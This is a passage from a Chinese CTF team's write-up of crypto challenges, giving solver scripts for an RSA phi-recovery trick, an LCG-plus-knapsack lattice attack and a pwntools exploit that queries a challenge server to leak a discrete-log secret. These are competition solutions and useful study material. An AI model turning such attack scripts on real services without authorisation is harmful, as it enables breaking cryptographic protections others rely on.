</span></span><span class=line><span class=cl><span class=n>c</span> <span class=o>=</span> <span class=mi>64885875317556090558238994066256805052213864161514435285748891561779867972960805879348109302233463726130814478875296026610171472811894585459078460333131491392347346367422276701128380739598873156279173639691126814411752657279838804780550186863637510445720206103962994087507407296814662270605713097055799853102</span>
</span></span><span class=line><span class=cl><span class=n>n</span> <span class=o>=</span> <span class=mi>113793513490894881175568252406666081108916791207947545198428641792768110581083359318482355485724476407204679171578376741972958506284872470096498674038813765700336353715590069074081309886710425934960057225969468061891326946398492194812594219890553185043390915509200930203655022420444027841986189782168065174301</span>
</span></span><span class=line><span class=cl><span class=n>e</span> <span class=o>=</span> <span class=mi>65537</span>
</span></span><span class=line><span class=cl><span class=n>f</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;trace.txt&#39;</span><span class=p>,</span><span class=s1>&#39;r&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>data</span> <span class=o>=</span> <span class=n>f</span><span class=o>.</span><span class=n>read</span><span class=p>()</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)[::</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>attack_phi</span><span class=p>(</span><span class=n>c</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>a</span> <span class=o>=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>    <span class=n>b</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>word</span> <span class=ow>in</span> <span class=n>c</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=s1>&#39;a, b =&#39;</span> <span class=ow>in</span> <span class=n>word</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>b</span> <span class=p>,</span><span class=n>a</span> <span class=o>=</span> <span class=n>a</span><span class=p>,</span><span class=n>b</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=s1>&#39;rshift1(a)&#39;</span> <span class=ow>in</span> <span class=n>word</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>a</span><span class=o>&lt;&lt;=</span><span class=mi>1</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=s1>&#39;rshift1(b)&#39;</span> <span class=ow>in</span> <span class=n>word</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>b</span><span class=o>&lt;&lt;=</span><span class=mi>1</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=s1>&#39;a = a - b&#39;</span> <span class=ow>in</span> <span class=n>word</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>a</span><span class=o>=</span><span class=n>a</span><span class=o>+</span><span class=n>b</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>a</span>
</span></span><span class=line><span class=cl><span class=n>phi</span> <span class=o>=</span> <span class=n>attack_phi</span><span class=p>(</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>d</span> <span class=o>=</span> <span class=n>invert</span><span class=p>(</span><span class=n>e</span><span class=p>,</span><span class=n>phi</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>long_to_bytes</span><span class=p>(</span><span class=nb>pow</span><span class=p>(</span><span class=n>c</span><span class=p>,</span><span class=n>d</span><span class=p>,</span><span class=n>n</span><span class=p>)))</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=fill>fill</h2><p>利用lcg的三组连续输出求出参数m和c，从而得到整个序列s，反求出序列M；然后就是一个背包的破解，lll算法求最短向量即可，构造方式参考：https://www.ruanx.net/lattice-2/，exp：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>M</span> <span class=o>=</span> <span class=p>[</span><span class=mi>19620578458228</span><span class=p>,</span> <span class=mi>39616682530092</span><span class=p>,</span> <span class=mi>3004204909088</span><span class=p>,</span> <span class=mi>6231457508054</span><span class=p>,</span> <span class=mi>3702963666023</span><span class=p>,</span> <span class=mi>48859283851499</span><span class=p>,</span> <span class=mi>4385984544187</span><span class=p>,</span> <span class=mi>11027662187202</span><span class=p>,</span> <span class=mi>18637179189873</span><span class=p>,</span> <span class=mi>29985033726663</span><span class=p>,</span> <span class=mi>20689315151593</span><span class=p>,</span> <span class=mi>20060155940897</span><span class=p>,</span> <span class=mi>46908062454518</span><span class=p>,</span> <span class=mi>8848251127828</span><span class=p>,</span> <span class=mi>28637097081675</span><span class=p>,</span> <span class=mi>35930247189963</span><span class=p>,</span> <span class=mi>20695167327567</span><span class=p>,</span> <span class=mi>36659598017280</span><span class=p>,</span> <span class=mi>10923228050453</span><span class=p>,</span> <span class=mi>29810039803392</span><span class=p>,</span> <span class=mi>4443991557077</span><span class=p>,</span> <span class=mi>31801732862419</span><span class=p>,</span> <span class=mi>23368424737916</span><span class=p>,</span> <span class=mi>15178683835989</span><span class=p>,</span> <span class=mi>34641771567914</span><span class=p>,</span> <span class=mi>44824471397533</span><span class=p>,</span> <span class=mi>31243260877608</span><span class=p>,</span> <span class=mi>27158599500744</span><span class=p>,</span> <span class=mi>2219939459559</span><span class=p>,</span> <span class=mi>20255089091807</span><span class=p>,</span> <span class=mi>24667494760808</span><span class=p>,</span> <span class=mi>46915118179747</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>S</span> <span class=o>=</span> <span class=mi>492226042629702</span>
</span></span><span class=line><span class=cl><span class=n>n</span> <span class=o>=</span> <span class=nb>len</span><span class=p>(</span><span class=n>M</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>L</span> <span class=o>=</span> <span class=n>matrix</span><span class=o>.</span><span class=n>zero</span><span class=p>(</span><span class=n>n</span> <span class=o>+</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>row</span><span class=p>,</span> <span class=n>x</span> <span class=ow>in</span> <span class=nb>enumerate</span><span class=p>(</span><span class=n>M</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>L</span><span class=p>[</span><span class=n>row</span><span class=p>,</span> <span class=n>row</span><span class=p>]</span> <span class=o>=</span> <span class=mi>2</span>
</span></span><span class=line><span class=cl>    <span class=n>L</span><span class=p>[</span><span class=n>row</span><span class=p>,</span> <span class=o>-</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=n>x</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>L</span><span class=p>[</span><span class=o>-</span><span class=mi>1</span><span class=p>,</span> <span class=p>:]</span> <span class=o>=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl><span class=n>L</span><span class=p>[</span><span class=o>-</span><span class=mi>1</span><span class=p>,</span> <span class=o>-</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=n>S</span>
</span></span><span class=line><span class=cl><span class=n>res</span> <span class=o>=</span> <span class=n>L</span><span class=o>.</span><span class=n>LLL</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>res</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># python</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Util.number</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>hashlib</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=n>nbits</span> <span class=o>=</span> <span class=mi>32</span>
</span></span><span class=line><span class=cl><span class=n>M</span> <span class=o>=</span> <span class=p>[</span><span class=mi>19621141192340</span><span class=p>,</span> <span class=mi>39617541681643</span><span class=p>,</span> <span class=mi>3004946591889</span><span class=p>,</span> <span class=mi>6231471734951</span><span class=p>,</span> <span class=mi>3703341368174</span><span class=p>,</span> <span class=mi>48859912097514</span><span class=p>,</span> <span class=mi>4386411556216</span><span class=p>,</span> <span class=mi>11028070476391</span><span class=p>,</span> <span class=mi>18637548953150</span><span class=p>,</span> <span class=mi>29985057892414</span><span class=p>,</span> <span class=mi>20689980879644</span><span class=p>,</span> <span class=mi>20060557946852</span><span class=p>,</span> <span class=mi>46908191806199</span><span class=p>,</span> <span class=mi>8849137870273</span><span class=p>,</span> <span class=mi>28637782510640</span><span class=p>,</span> <span class=mi>35930273563752</span><span class=p>,</span> <span class=mi>20695924342882</span><span class=p>,</span> <span class=mi>36660291028583</span><span class=p>,</span> <span class=mi>10923264012354</span><span class=p>,</span> <span class=mi>29810154308143</span><span class=p>,</span> <span class=mi>4444597606142</span><span class=p>,</span> <span class=mi>31802472725414</span><span class=p>,</span> <span class=mi>23368528779283</span><span class=p>,</span> <span class=mi>15179021971456</span><span class=p>,</span> <span class=mi>34642073901253</span><span class=p>,</span> <span class=mi>44824809996134</span><span class=p>,</span> <span class=mi>31243873675161</span><span class=p>,</span> <span class=mi>27159321498211</span><span class=p>,</span> <span class=mi>2220647072602</span><span class=p>,</span> <span class=mi>20255746235462</span><span class=p>,</span> <span class=mi>24667528459211</span><span class=p>,</span> <span class=mi>46916059974372</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>s0</span><span class=p>,</span><span class=n>s1</span><span class=p>,</span><span class=n>s2</span> <span class=o>=</span> <span class=mi>562734112</span><span class=p>,</span><span class=mi>859151551</span><span class=p>,</span><span class=mi>741682801</span>
</span></span><span class=line><span class=cl><span class=n>n</span> <span class=o>=</span> <span class=mi>991125622</span>
</span></span><span class=line><span class=cl><span class=n>m</span> <span class=o>=</span> <span class=p>(</span><span class=n>s2</span><span class=o>-</span><span class=n>s1</span><span class=p>)</span><span class=o>*</span><span class=n>inverse</span><span class=p>(</span><span class=n>s1</span><span class=o>-</span><span class=n>s0</span><span class=p>,</span><span class=n>n</span><span class=p>)</span><span class=o>%</span><span class=n>n</span>
</span></span><span class=line><span class=cl><span class=n>c</span> <span class=o>=</span> <span class=p>(</span><span class=n>s1</span><span class=o>-</span><span class=n>s0</span><span class=o>*</span><span class=n>m</span><span class=p>)</span><span class=o>%</span><span class=n>n</span>
</span></span><span class=line><span class=cl><span class=n>s</span> <span class=o>=</span> <span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>*</span> <span class=n>nbits</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=n>s0</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=n>nbits</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>s</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=p>(</span><span class=n>s</span><span class=p>[</span><span class=n>i</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span><span class=o>*</span><span class=n>m</span><span class=o>+</span><span class=n>c</span><span class=p>)</span><span class=o>%</span><span class=n>n</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>s</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>t</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>nbits</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>M</span><span class=p>[</span><span class=n>t</span><span class=p>]</span> <span class=o>=</span> <span class=n>M</span><span class=p>[</span><span class=n>t</span><span class=p>]</span> <span class=o>-</span> <span class=n>s</span><span class=p>[</span><span class=n>t</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>M</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># 注意是反向量</span>
</span></span><span class=line><span class=cl><span class=n>short</span> <span class=o>=</span> <span class=s1>&#39;00101000011000010001000010011011&#39;</span>
</span></span><span class=line><span class=cl><span class=n>short2</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>short</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>i</span> <span class=o>==</span> <span class=s1>&#39;0&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>short2</span> <span class=o>=</span> <span class=n>short2</span> <span class=o>+</span> <span class=s1>&#39;1&#39;</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>short2</span> <span class=o>=</span> <span class=n>short2</span> <span class=o>+</span><span class=s1>&#39;0&#39;</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>short2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>short2</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>num</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>short2</span><span class=p>,</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>sha256</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>num</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span><span class=o>.</span><span class=n>hexdigest</span><span class=p>())</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=babydlp>babyDLP</h2><p>CryptoCTF2022的原题side step，参考春哥的解法：https://zhuanlan.zhihu.com/p/546270351 exp需要修改两个地方，1是if (&lsquo;Great!&rsquo; in a):需要加上b，其次是a = a[9:]改为a = a[8:] 。然后直接打即可：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>sage.all</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Util.number</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Gao</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=fm>__init__</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>con</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s1>&#39;101.201.71.136&#39;</span><span class=p>,</span> <span class=mi>16265</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>p</span> <span class=o>=</span> <span class=mi>2</span> <span class=o>**</span> <span class=mi>1024</span> <span class=o>-</span> <span class=mi>2</span> <span class=o>**</span> <span class=mi>234</span> <span class=o>-</span> <span class=mi>2</span> <span class=o>**</span> <span class=mi>267</span> <span class=o>-</span> <span class=mi>2</span> <span class=o>**</span> <span class=mi>291</span> <span class=o>-</span> <span class=mi>2</span> <span class=o>**</span> <span class=mi>403</span> <span class=o>-</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>s_high</span> <span class=o>=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>Zp</span> <span class=o>=</span> <span class=n>Zmod</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>p</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>gao_check</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>con</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s1>&#39;T&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>ans</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>Zp</span><span class=p>(</span><span class=mi>4</span><span class=p>)</span><span class=o>.</span><span class=n>nth_root</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>s_high</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;Guessing: </span><span class=si>{}</span><span class=s1>&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>ans</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>con</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>ans</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>con</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;integer: </span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>a</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>con</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=sa>b</span><span class=s1>&#39;Great!&#39;</span> <span class=ow>in</span> <span class=n>a</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=n>a</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=n>ZZ</span><span class=p>(</span><span class=n>ans</span><span class=p>)</span><span class=o>.</span><span class=n>nbits</span><span class=p>())</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>gao_one</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>con</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;T&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>ans</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>Zp</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span><span class=o>.</span><span class=n>nth_root</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>s_high</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>con</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>ans</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>con</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;integer: </span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>a</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>con</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=sa>b</span><span class=s1>&#39;Great!&#39;</span> <span class=ow>in</span> <span class=n>a</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=n>a</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=n>ZZ</span><span class=p>(</span><span class=n>ans</span><span class=p>)</span><span class=o>.</span><span class=n>nbits</span><span class=p>())</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>a</span> <span class=o>=</span> <span class=n>a</span><span class=p>[</span><span class=mi>8</span><span class=p>:]</span>
</span></span><span class=line><span class=cl>        <span class=n>t</span><span class=p>,</span> <span class=n>r</span> <span class=o>=</span> <span class=nb>eval</span><span class=p>(</span><span class=n>a</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>s_high</span> <span class=o>&lt;&lt;=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>t</span> <span class=o>==</span> <span class=mi>0</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>s_high</span> <span class=o>|=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>t</span> <span class=o>=</span> <span class=mi>1</span> <span class=o>-</span> <span class=n>t</span>
</span></span><span class=line><span class=cl>        <span class=c1>#print(&#39;{:b}&#39;.format(self.s_high))</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>gao</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>while</span> <span class=p>(</span><span class=kc>True</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>gao_one</span><span class=p>()):</span>
</span></span><span class=line><span class=cl>                <span class=k>break</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>t</span> <span class=o>==</span> <span class=mi>1</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>gao_check</span><span class=p>()):</span>
</span></span><span class=line><span class=cl>                    <span class=k>break</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>gao_2</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>1023</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>gao_one</span><span class=p>()):</span>
</span></span><span class=line><span class=cl>                <span class=k>break</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>20</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                <span class=bp>self</span><span class=o>.</span><span class=n>gao_check</span><span class=p>()</span>
</span></span><span class=line><span class=cl>                <span class=bp>self</span><span class=o>.</span><span class=n>s_high</span> <span class=o>&gt;&gt;=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>g</span> <span class=o>=</span> <span class=n>Gao</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>g</span><span class=o>.</span><span class=n>gao_2</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><div class=blog-tags><a href=https://su-team.cn/tags/%E7%A5%A5%E4%BA%91%E6%9D%AF/>祥云杯</a>&nbsp;</div></article><ul class="pager blog-pager"><li class=previous><a href=https://su-team.cn/post/pcb-2022-su-wu/ data-toggle=tooltip data-placement=top title="2022 鹏城杯 SU Writeup">&larr; Previous Post</a></li><li class=next><a href=https://su-team.cn/post/ntfy-2022-su-wu/ data-toggle=tooltip data-placement=top title="第五届“强网”拟态防御国际精英挑战赛 SU Writeup">Next Post &rarr;</a></li></ul></div></div></div><footer><div class=container><div class=row><div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1"><ul class="list-inline text-center footer-links"><li><a href=https://ctftime.org/team/29641 title=CTFTime><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
<img src=https://su-team.cn/img/ctftime.svg title=CTFTime alt=CTFTime style=width:60%;height:60%;position:absolute;top:20%;left:20%></span></a></li><li><a href=mailto:suers_xctf@126.com title="Email me"><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
<i class="fas fa-envelope fa-stack-1x fa-inverse"></i></span></a></li><li><a href=https://github.com/team-su title=GitHub><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
<i class="fab fa-github fa-stack-1x fa-inverse"></i></span></a></li></ul><p class="credits copyright text-muted"><a href=https://su-team.cn>SUer</a>
&nbsp;&bull;&nbsp;&copy;
2026
&nbsp;&bull;&nbsp;
<a href=https://su-team.cn/>su-team</a></p><p class="credits theme-by text-muted"><a href=https://gohugo.io>Hugo v0.148.2</a> powered &nbsp;&bull;&nbsp; Theme <a href=https://github.com/halogenica/beautifulhugo>Beautiful Hugo</a> adapted from <a href=https://deanattali.com/beautiful-jekyll/>Beautiful Jekyll</a></p></div></div></div></footer><script defer src=https://su-team.cn/js/katex.min.js></script><script defer src=https://su-team.cn/js/auto-render.min.js></script><script src=https://su-team.cn/js/jquery-3.7.0.slim.min.js></script><script src=https://su-team.cn/js/bootstrap.min.js></script><script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1},{left:"\\begin{equation}",right:"\\end{equation}",display:!0},{left:"\\begin{align}",right:"\\end{align}",display:!0},{left:"\\begin{alignat}",right:"\\end{alignat}",display:!0},{left:"\\begin{gather}",right:"\\end{gather}",display:!0},{left:"\\(",right:"\\)",display:!1},{left:"\\[",right:"\\]",display:!0}]})})</script><script src=https://su-team.cn/js/main.js></script><script src=https://su-team.cn/js/photoswipe.min.js></script><script src=https://su-team.cn/js/photoswipe-ui-default.min.js></script><script src=https://su-team.cn/js/load-photoswipe.js></script></body></html>